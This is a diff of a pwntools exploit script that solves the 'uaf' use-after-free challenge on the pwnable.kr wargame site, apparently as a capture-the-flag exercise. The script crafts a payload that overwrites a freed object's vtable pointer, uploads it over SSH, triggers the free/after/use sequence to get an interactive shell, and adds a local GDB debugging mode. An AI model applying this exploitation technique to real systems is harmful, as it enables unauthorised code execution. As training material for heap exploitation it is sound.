@@ -28,24 +28,28 @@ I had a lot of troubles trying to debug this in gdb. Maybe GDB changes the progr
 whatever I sent in the payload, even of size 24, did not make a difference.
 """
 
-pwn.context(arch = "i386", os = "linux", log_level='debug')
+pwn.context.terminal = ["tmux", "splitw", "-h"]
+exe = pwn.context.binary = pwn.ELF('./uaf')
+
 random_file = "/tmp/%s" % pwn.util.fiddling.randoms(10)
 size_of_new = 24
 payload_length = size_of_new
 payload = pwn.p32(0x401568) + b'a' * (size_of_new - 4)
 print(pwn.hexdump(payload))
 
-exit(1)
-
-r = pwn.ssh("uaf", "pwnable.kr", 2222, "guest")
-r.upload_data(payload, random_file)
-p = r.process(["./uaf", str(payload_length), random_file])
+if pwn.args.GDB:
+    pwn.write('/tmp/payload', payload)
+    p = pwn.gdb.debug([exe.path, str(payload_length), random_file])
+else:
+    io = pwn.ssh("uaf", "pwnable.kr", 2222, "guest")
+    io.upload_data(payload, random_file)
+    p = io.process(["./uaf", str(payload_length), random_file])
 p.recvuntil('1. use\n2. after\n3. free\n')
-p.sendline('3');
+p.sendline('3')
 p.recvuntil('1. use\n2. after\n3. free\n')
-p.sendline('2');
+p.sendline('2')
 p.recvuntil('1. use\n2. after\n3. free\n')
-p.sendline('2');
+p.sendline('2')
 p.recvuntil('1. use\n2. after\n3. free\n')
-p.sendline('1');
+p.sendline('1')
 p.interactive()
